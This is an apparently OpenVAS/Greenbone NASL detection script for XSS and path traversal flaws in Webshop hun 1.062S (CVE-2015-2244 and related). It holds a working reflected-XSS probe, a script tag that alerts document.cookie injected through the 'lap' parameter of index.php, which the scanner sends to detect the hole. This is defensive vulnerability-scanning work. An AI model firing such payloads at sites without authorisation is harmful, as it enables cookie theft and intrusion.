# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805353");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2015-2244", "CVE-2015-2243", "CVE-2015-2242");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2015-03-16 15:21:14 +0530 (Mon, 16 Mar 2015)");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Webshop hun Multiple Vulnerabilities");

  script_tag(name:"summary", value:"Webshop hun is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaws are due to:

  - the 'param', 'center', 'lap', 'termid' and 'nyelv_id' parameter in index.php
    script not validated before returning it to users.

  - 'index.php' script is not properly sanitizing user input specifically path
    traversal style attacks (e.g. '../') via the 'mappa' parameter.

  - the index.php script not properly sanitizing user-supplied input via the
    'termid' and 'nyelv_id' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Webshop hun version 1.062S");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);
if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/webshop", http_cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:dir + "/",  port:http_port);

  if(rcvRes && rcvRes =~ "Powered by Webshop hun")
  {
    url = dir + "/index.php?lap=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E";

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document\.cookie\)</script>"))
     {
       report = http_report_vuln_url( port:http_port, url:url );
       security_message(port:http_port, data:report);
       exit(0);
     }
  }
}

exit(99);
